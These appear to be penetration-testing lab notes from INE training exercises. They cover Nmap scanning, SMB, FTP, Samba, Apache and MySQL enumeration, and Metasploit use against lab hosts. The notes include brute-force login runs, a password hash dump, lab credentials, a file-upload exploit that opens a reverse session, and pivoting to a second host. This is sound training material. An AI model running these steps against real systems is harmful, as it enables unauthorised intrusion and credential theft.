# Host Discovery Lab using Nmap

This lab demonstrates techniques to discover hosts behind a firewall using Nmap on a Kali Linux machine.

## Contents
- Basic ping test
- Nmap host discovery with `-Pn`
- Port scan and service version detection
- Understanding filtered ports

## Lab Commands Used
```bash
ping -c 5 demo.ine.local
nmap demo.ine.local
nmap -Pn demo.ine.local
nmap -Pn -p 443 demo.ine.local
nmap -Pn -sV -p 80 demo.ine.local
```
## Reference
  [Nmap Official Docs](https://nmap.org/)
# Host Discovery Lab using Nmap

This lab demonstrates how to perform host discovery on a network using **Nmap**. It focuses on identifying live hosts behind a firewall that may not respond to traditional ICMP ping requests.

##  Lab Steps Overview

1. **Ping the Target Host**
   ```bash
   ping -c 5 demo.ine.local
   ```
2. **Run Basic Nmap Scan**

```bash
  nmap demo.ine.local
```
3. **Use `-Pn` Option to Skip Host Discovery**

```bash
nmap -Pn demo.ine.local
```
4. **Scan Specific Port (e.g., 443)**

```bash
nmap -Pn -p 443 demo.ine.local
```
5. **Detect Application Version on Port 80**

```bash
nmap -Pn -sV -p 80 demo.ine.local
```
##  References

- [Nmap Official Documentation](https://nmap.org/)
- [Nmap Port Scanning Basics](https://nmap.org/book/man-port-scanning-basics.html)

#  Scan the Server 1

This lab walks through the process of using **Nmap** to scan a target machine for open ports and perform service detection.

---

## Step 1: Access the Kali Machine

- Open the lab link provided by the instructor or lab environment.
- This will give you access to a Kali Linux instance where you can execute all required commands.

---

## 📡 Step 2: Check if the Target Machine is Reachable

Use the `ping` command to ensure the target machine is online and reachable:

```bash
ping -c 4 demo.ine.local
```

- The `-c 4` flag sends 4 ICMP packets.
- If the target responds, it's reachable and ready for scanning.

**Result:** The target machine is reachable.

---

##  Step 3: Port Scanning with Nmap

###  Basic Nmap Scan

Run the default Nmap scan to identify commonly open ports:

```bash
nmap demo.ine.local
```

 **Note:**  
The default Nmap scan only checks the top 1000 most commonly used ports.  
In this case, **no open ports were found** using the default scan.

---

###  Full TCP Port Scan

To scan all **65,535 TCP ports**, use the `-p-` flag:

```bash
nmap demo.ine.local -p-
```

 **Result:** The scan reveals that **3 ports** are open on the target system.

---

##  Step 4: Service Detection with Nmap

Once the open ports are identified (e.g., 6421, 41288, 55413), use Nmap to perform **service and version detection**:

```bash
nmap demo.ine.local -p 6421,41288,55413 -sV
```

- The `-sV` flag tells Nmap to detect service versions running on the open ports.

 **Result:** The scan identifies the names and versions of the services running on the open ports.

---

##  Conclusion

In this lab, we successfully:

- Verified the availability of the target machine.
- Used Nmap to perform a **default** and **full TCP port scan**.
- Identified **3 open ports**.
- Used **service detection** to find out which services and versions were running on the open ports.

---

##  Tools Used

- **Kali Linux**
- **Nmap**

---

##  References

- [Nmap Official Documentation](https://nmap.org/book/man.html)
- [Kali Linux Tools](https://tools.kali.org/)

---

##  Author

> This document was generated as part of a penetration testing practice lab on the **INE platform**.
#  Lab: Windows Recon - SMB Nmap Scripts

This lab demonstrates how to use **Nmap SMB scripts** to perform reconnaissance on a Windows machine exposing SMB services.

---

##  Step 1: Access the Kali Machine

- Open the provided lab link to access the Kali Linux environment.

---

##  Step 2: Ping the Target Machine

Check if the target machine is alive:

```bash
ping -c 5 demo.ine.local
```

**Result:** All five packets were successfully sent and received, confirming the machine is up.

---

##  Step 3: Initial Nmap Scan

Run a basic Nmap scan to identify open ports:

```bash
nmap demo.ine.local
```

---

##  Step 4: Identify SMB Protocols

Check which SMB protocols are supported on port 445:

```bash
nmap -p445 --script smb-protocols demo.ine.local
```

---

##  Step 5: Check SMB Security Mode

Run the script to get SMB security mode details:

```bash
nmap -p445 --script smb-security-mode demo.ine.local
```

**Result:** Able to retrieve security level of SMB using a guest account.

🔗 [More Info](https://nmap.org/nsedoc/scripts/smb-security-mode.html)

---

##  Step 6: Enumerate Logged-in Users

### Without Credentials

```bash
nmap -p445 --script smb-enum-sessions demo.ine.local
```

> Found: user "bob" is logged in (guest login enabled - a misconfiguration)

### With Valid Credentials

```bash
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

---

##  Step 7: Enumerate SMB Shares

### Without Credentials

```bash
nmap -p445 --script smb-enum-shares demo.ine.local
```

**Result:** IPC$ share has read/write access via guest account.

📘 About IPC$: Null session share allowing enumeration.

🔗 [Read More](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session)

### With Credentials

```bash
nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

**Result:** Administrator has full access to C$ (C:\ drive)

---

##  Step 8: Enumerate Users on the Target

```bash
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

**Users Discovered:** Administrator, bob, Guest

---

##  Step 9: Get Server Statistics

```bash
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

**Result:** Server stats including failed logins, open files, and system errors.

 Note: Your output may vary depending on system activity.

---

##  Step 10: Enumerate Domains

```bash
nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

 **Result:** Built-in domain identified.

---

##  Step 11: Enumerate User Groups

```bash
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

---

##  Step 12: Enumerate Services

```bash
nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

---

## Step 13: List Files in Shared Folders

```bash
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

**Result:** All shared folders and their contents were listed.

---

##  Conclusion

In this lab, we used multiple Nmap SMB scripts to:

- Discover SMB versions and security modes
- Enumerate sessions, shares, users, groups, and services
- Check permissions with and without credentials

---

##  Tools Used

- Kali Linux
- Nmap with SMB NSE scripts

---

##  References

- [Nmap Official Site](https://nmap.org/)
- [Nmap SMB Scripts Documentation](https://nmap.org/nsedoc/scripts)
- [Microsoft IPC$ Documentation](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session)
- [INE Lab Page](https://my.ine.com/CyberSecurity/courses/a415dc11-1c2a-43d5-86ae-1f919d5661cd/assessment-methodologies-footprinting-scanning/lab/5ace3b40-27a1-4322-8891-694e801f4b4d)

# Lab: Importing Nmap Scan Results Into Metasploit & Service Scanning

## Overview

This lab demonstrates the process of:
1. Importing Nmap scan results into the Metasploit Framework (MSF)
2. Performing a port scan using different methods
3. Exploiting a vulnerable XODA web app instance
4. Routing and scanning a second target machine

---

## Part 1: Importing Nmap Scan Results Into MSF

### Step 1: Access Kali Machine
Open the lab link to access the Kali Linux environment.

### Step 2: Ping Target Machine
```bash
ping -c 4 demo.ine.local
```
If not reachable, use the `-Pn` option in Nmap to skip host discovery.

### Step 3: Perform Nmap Scan and Save Output
```bash
nmap -sV -Pn -oX myscan.xml demo.ine.local
```

### Step 4: Start PostgreSQL Service
```bash
service postgresql start
```

### Step 5: Start Metasploit Framework
```bash
msfconsole
```

### Step 6: Check Database Status
```bash
db_status
```

### Step 7: Import Scan Results into MSF
```bash
db_import myscan.xml
```

### Step 8: View Imported Results
```bash
hosts
services
```

---

## Part 2: T1046 - Network Service Scanning

### Step 1: Access Kali Machine

### Step 2: Ping New Target
```bash
ping -c 4 demo1.ine.local
```

### Step 3: Default Nmap Scan
```bash
nmap demo1.ine.local
```

### Step 4: View HTTP Content
```bash
curl demo1.ine.local
```

### Step 5: Start Metasploit
```bash
msfconsole
```

### Step 6: Exploit XODA File Upload
```bash
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit
```

### Step 7: Check Network Interfaces
```bash
shell
ip addr
```

### Step 8: Add Route to MSF
```bash
run autoroute -s 192.180.108.2
```

### Step 9: Port Scan Second Target
```bash
CTRL+Z
y
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit
```

---

## Part 3: Bash & Static Binary Scanning

### Step 10: Check Nmap Binary
```bash
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
```

### Step 11: Create Bash Port Scanner Script
```bash
#!/bin/bash
for port in {1..1000}; do
  timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```
Save as: `bash-port-scanner.sh`

### Step 12: Return to Meterpreter
```bash
fg
sessions -i 1
```

### Step 13: Upload Files
```bash
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
```

### Step 14: Make Executable and Run Scanner
```bash
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3
```

### Step 15: Use Nmap Binary to Scan
```bash
./nmap -p- 192.180.108.3
```

---

## References

- MITRE ATT&CK: [T1046 - Network Service Scanning](https://attack.mitre.org/techniques/T1046/)
- Bash TCP Port Scanner: [https://catonmat.net/tcp-port-scanner-in-bash](https://catonmat.net/tcp-port-scanner-in-bash)

# FTP and Samba Reconnaissance Lab

This document provides a step-by-step guide to performing FTP and SMB (Samba) reconnaissance using tools like **Metasploit**, **Nmap**, **smbclient**, and **rpcclient** on a Kali Linux machine.

---

## Lab 1: FTP Enumeration

### Step 1: Access Kali Machine
Open the lab link to access the Kali virtual machine.

### Step 2: Check Connectivity
```bash
ping -c 4 demo.ine.local
```
Ensure the target is reachable.

### Step 3: FTP Version Enumeration (Metasploit)
```bash
msfconsole
use auxiliary/scanner/ftp/ftp_version
set RHOSTS demo.ine.local
run
```
Result: Target is running **ProFTPD 1.3.5a**

### Step 4: FTP Brute Force Login (Metasploit)
```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```
Result: Credentials found — `sysadmin:654321`

### Step 5: Anonymous Login Check
```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS demo.ine.local
run
```
Result: Anonymous login **not allowed**

### Step 6: Login to FTP Server
```bash
ftp demo.ine.local
# Username: sysadmin
# Password: 654321
```
Result: Authentication successful

---

## Lab 2: Samba Reconnaissance

### Step 1: Access Kali Machine
Open the lab link to access the Kali virtual machine.

### Step 2: Find TCP Ports Used by SMB
```bash
nmap demo.ine.local
```
Result: Ports **139** and **445** open

### Step 3: Find UDP Ports Used by NMBD
```bash
nmap -sU --top-ports 25 demo.ine.local
```
Result: Ports **137** and **138** open

### Step 4: Get Workgroup Name
```bash
nmap -sV -p 445 demo.ine.local
```
Result: Workgroup — **RECONLABS**

### Step 5: Discover Exact Samba Version (Nmap Script)
```bash
nmap --script smb-os-discovery.nse -p 445 demo.ine.local
```
Result: **Samba 4.3.11-Ubuntu**

### Step 6: Discover Samba Version (Metasploit)
```bash
msfconsole -q
use auxiliary/scanner/smb/smb_version
set RHOSTS demo.ine.local
exploit
```
Result: **Samba 4.3.11-Ubuntu**

### Step 7: NetBIOS Computer Name via Nmap Script
```bash
nmap --script smb-os-discovery.nse -p 445 demo.ine.local
```
Result: **SAMBA-RECON**

### Step 8: NetBIOS Name via nmblookup
```bash
nmblookup -A demo.ine.local
```
Result: **SAMBA-RECON**

### Step 9: Anonymous Access Check via smbclient
```bash
smbclient -L demo.ine.local -N
```
Result: Anonymous access **allowed**

### Step 10: Anonymous Access Check via rpcclient
```bash
rpcclient -U "" -N demo.ine.local
```
Result: Anonymous access **allowed**

---

## Conclusion

- In **Lab 1**, we learned how to enumerate FTP services using Metasploit and identify valid login credentials.
- In **Lab 2**, we performed a comprehensive Samba enumeration using both Metasploit and Nmap, and confirmed the possibility of anonymous access.

---

## References

1. [Samba](https://www.samba.org/)
2. [smbclient Manual](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
3. [rpcclient Manual](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
4. [nmblookup Manual](https://www.samba.org/samba/docs/current/man-html/nmblookup.1.html)
5. [Nmap Script: smb-os-discovery](https://nmap.org/nsedoc/scripts/smb-os-discovery.html)
6. [Metasploit Module: SMB Version Detection](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_version)


# Apache & MySQL Enumeration Labs using Metasploit

## Lab 1: Apache Enumeration

### Step 1: Access the Kali Machine
Open the lab link to access your Kali Linux machine.

### Step 2: Check Target Availability
```bash
ping -c 5 victim-1
```

### Step 3: Start Metasploit Framework
```bash
msfconsole -q
```

### Step 4: Run Auxiliary Modules

#### Module 1: `http_version`
```bash
use auxiliary/scanner/http/http_version
set RHOSTS victim-1
run
```

#### Module 2: `robots_txt`
```bash
use auxiliary/scanner/http/robots_txt
set RHOSTS victim-1
run
```

#### Module 3: `http_header`
```bash
use auxiliary/scanner/http/http_header
set RHOSTS victim-1
run

use auxiliary/scanner/http/http_header
set RHOSTS victim-1
set TARGETURI /secure
run
```

#### Module 4: `brute_dirs`
```bash
use auxiliary/scanner/http/brute_dirs
set RHOSTS victim-1
run
```

#### Module 5: `dir_scanner`
```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS victim-1
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

#### Module 6: `dir_listing`
```bash
use auxiliary/scanner/http/dir_listing
set RHOSTS victim-1
set PATH /data
run
```

#### Module 7: `files_dir`
```bash
use auxiliary/scanner/http/files_dir
set RHOSTS victim-1
set VERBOSE false
run
```

#### Module 8: `http_put` (Upload and Delete File)
```bash
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run

wget http://victim-1:80/data/test.txt
cat test.txt

# Delete the file
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set ACTION DELETE
run

# Try downloading again (should fail with 404)
wget http://victim-1:80/data/test.txt
```

#### Module 9: `http_login`
```bash
use auxiliary/scanner/http/http_login
set RHOSTS victim-1
set AUTH_URI /secure/
set VERBOSE false
run
```

#### Module 10: `apache_userdir_enum`
```bash
use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set RHOSTS victim-1
set VERBOSE false
run
```

### Conclusion
Learned Apache enumeration techniques using Metasploit modules.

---

## Lab 2: MySQL Enumeration

### Step 1: Access the Kali Machine
Open the lab link to access your Kali Linux machine.

### Step 2: Check Target Availability
```bash
ping -c 4 demo.ine.local
```

### Step 3: Nmap Scan
```bash
nmap demo.ine.local
```

### Step 4: `mysql_version`
```bash
msfconsole -q
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run
```

### Step 5: `mysql_login`
```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

### Step 6: `mysql_enum`
```bash
use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

### Step 7: `mysql_sql`
```bash
use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

### Step 8: `mysql_file_enum`
```bash
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
```

### Step 9: `mysql_hashdump`
```bash
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

### Step 10: `mysql_schemadump`
```bash
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

### Step 11: `mysql_writable_dirs`
```bash
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

### Conclusion
Successfully explored MySQL enumeration using relevant Metasploit modules.

---

## References

- [Apache](https://httpd.apache.org/)
- [Metasploit Modules](https://www.rapid7.com/db/)
- [MySQL](https://www.mysql.com/)

